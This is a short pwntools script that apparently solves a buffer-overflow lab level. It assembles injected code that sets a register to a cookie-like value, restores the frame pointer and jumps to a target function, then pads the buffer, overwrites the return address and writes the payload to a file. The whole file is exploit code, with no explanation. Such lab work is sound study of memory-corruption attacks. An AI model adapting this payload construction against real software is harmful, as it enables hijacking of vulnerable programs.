from pwn import *

data=asm('''
        mov eax, 0x2b65becd
        mov ebp, 0x55683850
        push 0x8048dbe
        ret
          ''')
data += b"f"*(0x2c-len(data))
data+=p32(0x556837f8)
data+=b'\x0a'
with open("txt4.txt", "wb") as f:
    f.write(data)